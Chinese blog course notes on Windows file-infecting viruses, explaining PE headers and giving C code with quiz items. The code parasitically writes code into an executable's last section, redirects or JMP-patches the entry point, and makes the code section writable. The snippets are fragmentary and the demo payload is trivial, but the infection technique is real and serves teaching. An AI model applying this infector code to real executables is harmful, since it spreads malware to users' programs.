class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR);</span><br><span class="line">fseek(fp, <span class="number">8</span>, SEEK_CUR);<span class="comment">//VirtualSize字段前有8字节的节名</span></span><br><span class="line"><span class="keyword">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + codeSize;</span><br><span class="line">fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp);</span><br><span class="line"><span class="comment">//将原入口点的5个字节（即将被覆盖）保存一下</span></span><br><span class="line"><span class="keyword">char</span> firstCode[<span class="number">5</span>];</span><br><span class="line">fseek(fp, entryDiskOffset, SEEK_SET);  <span class="comment">//定位到入口点的文件位置</span></span><br><span class="line">fread(firstCode, <span class="number">5</span>, <span class="number">1</span>, fp); <span class="comment">//将这5个字节保存到firstCode，后面作为getCode函数的最后一个参数</span></span><br><span class="line"><span class="comment">//在入口点处插入JMP指令，该指令跳到感染的病毒代码处</span></span><br><span class="line"><span class="keyword">char</span> jmpCode[<span class="number">5</span>];</span><br><span class="line">jmpCode[<span class="number">0</span>] = <span class="number">0xe9</span>;</span><br><span class="line"><span class="comment">//跳转目的地址为：感染代码的位置，即最后一个节的VirtualAddress+VirualSize</span></span><br><span class="line"><span class="comment">//跳转的源地址为：JMP指令后面，即AddressOfEntryPoint + 5 （JMP指令长度）</span></span><br><span class="line">*(<span class="keyword">long</span> *)(jmpCode + <span class="number">1</span>) = lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize - (ntHdrs.OptionalHeader.AddressOfEntryPoint + <span class="number">5</span>);</span><br><span class="line">fseek(fp, entryDiskOffset, SEEK_SET); <span class="comment">//定位到入口点的文件位置</span></span><br><span class="line">fwrite(jmpCode, <span class="number">5</span>, <span class="number">1</span>, fp);<span class="comment">//写入这条JMP指令</span></span><br><span class="line"><span class="comment">//传递4个参数给getCode函数，生成病毒寄生代码</span></span><br><span class="line"><span class="keyword">char</span>* code = getCode(ntHdrs.OptionalHeader.AddressOfEntryPoint, </span><br><span class="line">                       lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize,</span><br><span class="line">                       ntHdrs.OptionalHeader.ImageBase, firstCode);</span><br><span class="line"><span class="comment">//写入病毒寄生代码到文件中的最后一个节</span></span><br><span class="line">fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize, SEEK_SET);</span><br><span class="line">fwrite(code, codeSize, <span class="number">1</span>, fp);    </span><br><span class="line"><span class="built_in">free</span>(code);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//修改ImageSize</span></span><br><span class="line">locateNTHdrStart(fp);</span><br><span class="line"><span class="keyword">int</span> offsetImageSize = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line">fseek(fp, offsetImageSize, SEEK_CUR);</span><br><span class="line"><span class="keyword">int</span> accurateSize = (lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize + codeSize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pageNum = accurateSize  / ntHdrs.OptionalHeader.SectionAlignment;</span><br><span class="line"><span class="keyword">int</span> imageSize = (pageNum) * ntHdrs.OptionalHeader.SectionAlignment &lt; accurateSize ? (pageNum + <span class="number">1</span>) * ntHdrs.OptionalHeader.SectionAlignment : accurateSize;<span class="comment">//取上整</span></span><br><span class="line"></span><br><span class="line">fwrite(&amp;imageSize, <span class="keyword">sizeof</span>(imageSize), <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><ol><li>关于寄生在Windows文件中的病毒数据区，下列说法不正确的是（       ）<br />A. 尽管PE文件本身提供了重定位机制，但访问病毒数据区还是需要自定位<br />B. 病毒数据区在寄生前，往往需要感染时借助病毒main函数传递的参数来进行数据填写<br />C. 病毒数据区的预期加载地址需要借助PE文件的相关字段信息计算出来<br />D. 病毒数据区的预期加载地址也可以通过内嵌汇编标号的方式获得</li></ol><p>参考答案：D</p><p>解析：病毒数据区的预期加载地址只能算出来，不能通过内嵌汇编标号的方式获得</p><h3 id="为入口点所在节增加内存可写属性"><a class="markdownIt-Anchor" href="#为入口点所在节增加内存可写属性"></a> 为入口点所在节增加内存可写属性</h3><ol><li>循环搜索入口点所在的节</li><li>找到后保存该节的索引和属性字段</li><li>然后在文件中定位到该节的节头，计算新的属性值并写入到节头的属性字段</li></ol><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> entrySectionIndex;  <span class="comment">//变量 - 存入口点所在节的索引</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> characteristic;   <span class="comment">//变量 - 存入口点所在节的属性</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="comment">//找到入口点所在的节</span></span><br><span class="line">    <span class="keyword">if</span> ((entry &gt;= curHdr.VirtualAddress) &amp;&amp; </span><br><span class="line">         (entry &lt;= curHdr.VirtualAddress + curHdr.Misc.VirtualSize))</span><br><span class="line">    &#123;</span><br><span class="line">        entryOffsetToSectionStart = entry - curHdr.VirtualAddress;</span><br><span class="line">        entryDiskOffset = curHdr.PointerToRawData + entryOffsetToSectionStart;</span><br><span class="line">        entrySectionIndex = i; <span class="comment">//记录入口点所在节的索引值</span></span><br><span class="line">        characteristic = curHdr.Characteristics;  <span class="comment">//保存入口点所在节的原属性值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改入口点所在代码节的属性，添加可写属性80000000h</span></span><br><span class="line"><span class="comment">//先在文件中定位到节表的位置，节表在NT头的后面</span></span><br><span class="line">locateNTHdrStart(fp);   <span class="comment">//在文件中定位到NT头的位置</span></span><br><span class="line">fseek(fp, <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS), SEEK_CUR);  <span class="comment">//移动NT头长度，定位节表</span></span><br><span class="line"><span class="comment">//所在节的节头位置为：该节索引*每个节头长度</span></span><br><span class="line"><span class="comment">//获得属性字段离该节节头的偏移</span></span><br><span class="line"><span class="keyword">int</span> offsetCha = (<span class="keyword">int</span>)&amp;(((IMAGE_SECTION_HEADER *)<span class="number">0</span>)-&gt;Characteristics);</span><br><span class="line"><span class="comment">//定位属性字段的文件位置：节头位置+属性字段离节头的偏移</span></span><br><span class="line">fseek(fp, (entrySectionIndex * <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER)) + offsetCha, SEEK_CUR);</span><br><span class="line"><span class="comment">//计算新的属性值</span></span><br><span class="line">characteristic = characteristic | <span class="number">0x80000000</span>;</span><br><span class="line"><span class="comment">//文件中写入新的属性值</span></span><br><span class="line">fwrite(&amp;characteristic, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;入口点模糊技术&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#入口点模糊技术&quot;&gt;&lt;/a&gt; 入口点模糊技术&lt;/h2&gt;
&lt;p&gt;Entry Point Obscuring（EPO）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;EPO是病毒代码隐藏自己入口点，避免被查杀的一种技术&lt;/li&gt;
&lt;li&gt;EPO使得被病毒修改的入口点看起来依然像是正常的入口点&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_末节寄生程序设计</title>
    <link href="https://wsw8.online/archives/3ac768f6.html"/>
    <id>https://wsw8.online/archives/3ac768f6.html</id>
    <published>2021-05-19T01:14:44.000Z</published>
    <updated>2021-05-19T01:42:24.834Z</updated>
    
    <content type="html"><![CDATA[<h2 id="末节大小不变的寄生"><a class="markdownIt-Anchor" href="#末节大小不变的寄生"></a> 末节大小不变的寄生</h2><h3 id="需要修改的地方"><a class="markdownIt-Anchor" href="#需要修改的地方"></a> 需要修改的地方</h3><ol><li>填写eb 02 90 90机器码（病毒机器码）</li><li>修改AddressOfEntryPoint</li><li>修改节的VirtualSize</li><li>节的SizeOfRawData不需要修改</li><li>可选映像头SizeOfImage</li></ol><span id="more"></span><h3 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h3><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210519091939767.png" alt="image-20210519091939767" /></p><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="comment">// 4个字节，放病毒代码 EB 02 09 09</span></span><br><span class="line"><span class="keyword">char</span> code[<span class="number">4</span>];</span><br><span class="line"><span class="comment">//DOS头字段e_lfanew字段偏移0x3c</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> OFFSET_OPTHDR_START 0x3c   </span></span><br><span class="line"><span class="comment">//变量ntHdrs  PE文件头（NT头）</span></span><br><span class="line">IMAGE_NT_HEADERS ntHdrs;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数将文件指针定位到NT头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">locateNTHdrStart</span><span class="params">(FILE * fp)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> hdrStart;    <span class="comment">//4个字节，放NT头的偏移量</span></span><br><span class="line">fseek(fp, OFFSET_OPTHDR_START, SEEK_SET); <span class="comment">//定位到e_lfanew字段，0x3c位置</span></span><br><span class="line">fread(&amp;hdrStart, <span class="keyword">sizeof</span>(hdrStart), <span class="number">1</span>, fp); <span class="comment">//读e_lfanew的值到hdrStart</span></span><br><span class="line">fseek(fp, hdrStart, SEEK_SET);               <span class="comment">//定位到NT头</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数读入整个NT头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readHdrs</span><span class="params">(FILE * fp)</span>             </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">locateNTHdrStart(fp);</span><br><span class="line">fread(&amp;ntHdrs, <span class="keyword">sizeof</span>(ntHdrs), <span class="number">1</span>, fp);  <span class="comment">//取出一个PE头大小的数据到ntHdrs</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数生成寄生的病毒代码 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">code[<span class="number">0</span>] = <span class="number">0xEB</span>;</span><br><span class="line">code[<span class="number">1</span>] = <span class="number">0x02</span>;</span><br><span class="line">code[<span class="number">2</span>] = <span class="number">0x90</span>;</span><br><span class="line">code[<span class="number">3</span>] = <span class="number">0x90</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获得病毒代码以及读文件NT头的主函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获得病毒代码</span></span><br><span class="line">getCode();  </span><br><span class="line"><span class="comment">//打开命令行参数args[1]给出的文件</span></span><br><span class="line">FILE * fp;    </span><br><span class="line">fp = fopen(args[<span class="number">1</span>], “rb+”);   </span><br><span class="line"><span class="comment">//读入文件的NT头</span></span><br><span class="line">readHdrs(fp);      </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下代码为找到最后一个节并判断是否有空洞，此时文件指针正好指向节表项起始的位置</span></span><br><span class="line"><span class="comment">// 获得节的数量</span></span><br><span class="line"><span class="keyword">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;   <span class="comment">//映像文件头中获得节的总数量</span></span><br><span class="line"><span class="comment">// 定位到最后一个节表项</span></span><br><span class="line">fseek(fp, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER) * (sectionNum - <span class="number">1</span>), SEEK_CUR); IMAGE_SECTION_HEADER lastSectionHdr;   <span class="comment">//winnt.h给出了节表项的结构体</span></span><br><span class="line">fread(&amp;lastSectionHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);    <span class="comment">//读入最后节的节表项</span></span><br><span class="line"><span class="comment">// 判断最后一节是否有寄生的空洞</span></span><br><span class="line"><span class="keyword">if</span> (lastSectionHdr.SizeOfRawData - lastSectionHdr.Misc.VirtualSize &lt; <span class="number">4</span>)</span><br><span class="line">&#123;<span class="comment">//如果最后段的填充部分不够寄生代码的长度，无法寄生，就退出不感染</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the last section has not enough space to save virus\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改最后一个节的VirtualSize，在最后一个节写入寄生的病毒代码</span></span><br><span class="line"><span class="comment">//修改最后节的VirtualSize</span></span><br><span class="line"> <span class="comment">//之前读了最后一个节表项，重新定位回去</span></span><br><span class="line">fseek(fp, - <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR);  </span><br><span class="line"> <span class="comment">//后移8个字节跳过name字段，定位到VirtualSize字段</span></span><br><span class="line">fseek(fp, <span class="number">8</span>, SEEK_CUR);</span><br><span class="line"><span class="keyword">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + <span class="number">4</span>;    <span class="comment">//计算新的VirtualSize的值</span></span><br><span class="line">fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp);    <span class="comment">//写入新VirutalSize值到文件中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//写入寄生代码</span></span><br><span class="line"><span class="comment">//寄生位置：最后一个节的起始位置PointerToRawData + 原来的VirtualSize</span></span><br><span class="line">fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize , SEEK_SET);</span><br><span class="line">fwrite(code, <span class="number">4</span>, <span class="number">1</span>, fp);<span class="comment">//写4字节的寄生代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改SizeOfImage和EntryPoint</span></span><br><span class="line"><span class="comment">//1. 获取AddressOfEntry和SizeOfImage字段到NT头的偏移量</span></span><br><span class="line"><span class="keyword">int</span> offsetEntry = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="keyword">int</span> offsetImageSize = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 修改SizeOfImage  （文件指针在NT头）</span></span><br><span class="line">locateNTHdrStart(fp);                      <span class="comment">//重新定位到NT头</span></span><br><span class="line">fseek(fp, offsetImageSize, SEEK_CUR);                    <span class="comment">// 定位到字段SizeOfImage</span></span><br><span class="line"><span class="comment">//  ( RVA + VirtualSize + 4  /  SectionAlignment ) 向上取整</span></span><br><span class="line"><span class="keyword">int</span> accurateSize = (lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize + <span class="number">4</span>); </span><br><span class="line"><span class="keyword">int</span> pageNum = accurateSize  / ntHdrs.OptionalHeader.SectionAlignment;   </span><br><span class="line"><span class="keyword">int</span> imageSize = (pageNum) * ntHdrs.OptionalHeader.SectionAlignment &lt; accurateSize ? </span><br><span class="line">                   (pageNum + <span class="number">1</span>) * ntHdrs.OptionalHeader.SectionAlignment : accurateSize;   <span class="comment">//取上整</span></span><br><span class="line"><span class="comment">// 写入新的SizeOfImage值</span></span><br><span class="line">fwrite(&amp;imageSize, <span class="keyword">sizeof</span>(imageSize), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 修改入口点AddressOfEntryPoint</span></span><br><span class="line">locateNTHdrStart(fp);<span class="comment">//重新定位文件指针到NT头</span></span><br><span class="line">fseek(fp, offsetEntry, SEEK_CUR);<span class="comment">//定位到AdressOfEntryPoint字段</span></span><br><span class="line"><span class="comment">// 新的入口RVA = 最后节的起始RVA + 最后节原来的VirtualSize，这样就指向寄生代码起始了</span></span><br><span class="line"><span class="keyword">int</span> entry = lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize;</span><br><span class="line">fwrite(&amp;entry, <span class="keyword">sizeof</span>(entry), <span class="number">1</span>, fp);<span class="comment">//写新的入口RVA</span></span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure><h3 id="返回原始程序"><a class="markdownIt-Anchor" href="#返回原始程序"></a> 返回原始程序</h3><p>在病毒代码最后增加JMP xx xx xx xx</p><p>位移量如何计算？</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210519093251556.png" alt="image-20210519093251556" /></p><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><ol><li>将病毒寄生在末节空洞的程序设计中，下列说法不正确的是（       ）<br />A.  &lt;windows.h&gt;和&lt;winnt.h&gt;提供了PE文件头相关的结构体定义<br />B.  病毒程序想访问AddressOfEntryPoint时，可以先将NT头信息由文件读到相应的结构体变量中<br />C.  病毒程序需要生成寄生到原文件的病毒代码<br />D.  寄生完成后，病毒程序需要修改结构体变量中的成员virtualSize和imageSize来确保寄生的病毒代码被加载到内存</li></ol><p>参考答案：D</p><p>解析：病毒程序没有修改结构体变量中的成员，而是直接更改文件</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;末节大小不变的寄生&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#末节大小不变的寄生&quot;&gt;&lt;/a&gt; 末节大小不变的寄生&lt;/h2&gt;
&lt;h3 id=&quot;需要修改的地方&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#需要修改的地方&quot;&gt;&lt;/a&gt; 需要修改的地方&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;填写eb 02 90 90机器码（病毒机器码）&lt;/li&gt;
&lt;li&gt;修改AddressOfEntryPoint&lt;/li&gt;
&lt;li&gt;修改节的VirtualSize&lt;/li&gt;
&lt;li&gt;节的SizeOfRawData不需要修改&lt;/li&gt;
&lt;li&gt;可选映像头SizeOfImage&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_PE结构和末节寄生</title>
    <link href="https://wsw8.online/archives/20191e8a.html"/>
    <id>https://wsw8.online/archives/20191e8a.html</id>
    <published>2021-05-12T12:18:01.000Z</published>
    <updated>2021-05-19T01:11:34.934Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pe格式"><a class="markdownIt-Anchor" href="#pe格式"></a> PE格式</h2><p>在Win32位平台可执行文件命名为可移植的可执行文件（Portable Executable File），该文件的格式就是PE格式</p><p>在Win32系统中，常见的EXE，DLL，SYS，COM等可执行文件都是PE文件</p><span id="more"></span><h3 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h3><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517151959406.png" alt="image-20210517151959406" /></p><h3 id="映像"><a class="markdownIt-Anchor" href="#映像"></a> 映像</h3><ol><li>PE文件的加载要完成虚拟地址（内存）和PE文件（硬盘）之间的映射关系，所以又被称为映像文件</li><li>当真正执行某个内存页的指令或访问一个页的数据时，这个页面才会真正读入内存</li><li>所以文件装入速度与文件大小关系不大</li><li>注意区分文件位置与虚拟地址与相对虚拟地址</li></ol><h3 id="相对虚拟地址rva"><a class="markdownIt-Anchor" href="#相对虚拟地址rva"></a> 相对虚拟地址（RVA）</h3><ol><li><p>虚拟地址，即我们前面提到的逻辑地址，指的是内存中的地址（注意和硬盘上文件中的位置相区分）</p></li><li><p>相对地址，即相对PE文件加载到内存后占用的最开始的那个内存单元的逻辑地址（基地址）</p></li><li><p>区分RVA和FOA</p><blockquote><p>RVA：内存中的相对位置，相对的是加载到内存的基地址</p><p>FOA：文件中的相对位置，相对的是文件的开始位置（即0）</p><p>在文件中，一个节往往按512B（200H）的粒度对齐</p><p>在内存中，一个节通常按4096（1000H）的粒度对齐</p><p>所以内存的RVA和文件的FOA通常是不一致的</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517153940694.png" alt="image-20210517153940694" /></p><p>（由于装载时前面的一般不动，DOS部分、PE文件头部分、节表部分、和第一个节的RVA和FOA通常一致）</p></blockquote></li><li><p>图示</p><blockquote><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517153120815.png" alt="image-20210517153120815" /></p><p>在图示中，基地址是0x00400000，.text节的RVA是0x1560，VA是0x00401560</p></blockquote></li></ol><h3 id="dos头部分"><a class="markdownIt-Anchor" href="#dos头部分"></a> DOS头部分</h3><p>图示，仅供参考无需记忆：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517154415235.png" alt="image-20210517154415235" /></p><p>头部的e_magic，就是两个字符MZ，代表DOS文件<br />最后一个字段e_lfanew是偏移量，就是文件开始到PE文件头（NT头）的偏移量</p><h3 id="pe头"><a class="markdownIt-Anchor" href="#pe头"></a> PE头</h3><p>包含3个部分</p><ol><li>PE文件标志（Signature）</li><li>映像文件头（IMAGE_FILE_HEADER）</li><li>可选映像文件头（IMAGE_OPTIONAL_HEADER32）</li></ol><h4 id="pe文件标志"><a class="markdownIt-Anchor" href="#pe文件标志"></a> PE文件标志</h4><p>两个字节为PE表明是PE格式文件</p><p>故而判断文件是否为PE格式可以通过：</p><ol><li>先判断文件头2个字节是否为MZ</li><li>判断NT头（PE头）的Signature是否为PE</li></ol><h4 id="映像文件头"><a class="markdownIt-Anchor" href="#映像文件头"></a> 映像文件头</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517155329619.png" alt="image-20210517155329619" /></p><p>对病毒来说，可能需要用到NumberOfSections</p><h4 id="可选映像头"><a class="markdownIt-Anchor" href="#可选映像头"></a> 可选映像头</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Option Header </span><br><span class="line">TImage_Optional_Header32 = record</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Magic: Word;</span><br><span class="line">    MajorLinkerVersion: Byte;</span><br><span class="line">    MinorLinkerVersion: Byte;</span><br><span class="line">    SizeOfCode: Cardinal;</span><br><span class="line">    SizeOfInitializedData: Cardinal;</span><br><span class="line">    SizeOfUninitializedData: Cardinal;</span><br><span class="line">    AddressOfEntryPoint: Cardinal;         <span class="comment">//代码入口RVA，第一条指令的RAV</span></span><br><span class="line">    BaseOfCode: Cardinal;</span><br><span class="line">    BaseOfData: Cardinal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    ImageBase: Cardinal;<span class="comment">//载入程序的首选RAV</span></span><br><span class="line">    SectionAlignment: Cardinal;<span class="comment">//节在内存中对齐方式</span></span><br><span class="line">    FileAlignment: Cardinal;<span 